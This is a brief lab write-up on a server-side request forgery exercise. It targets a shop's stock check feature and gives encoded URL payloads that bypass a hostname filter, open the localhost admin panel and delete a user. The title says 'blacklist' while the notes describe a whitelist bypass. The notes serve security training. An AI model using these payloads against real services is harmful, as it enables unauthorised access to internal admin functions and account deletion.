Lab: SSRF with blacklist-based input filter

Vulnerable feature: Stock check functionality.

Goal: change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

Analysis:
local host: http://localhost%2523@stock.weliketoshop.net
Bypassed their white list filter which says that the hostname should be stock.weliketoshop.net, so we used # for url fragmentation.

admin interface: http://localhost%2523@stock.weliketoshop.net/admin

delete user: http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
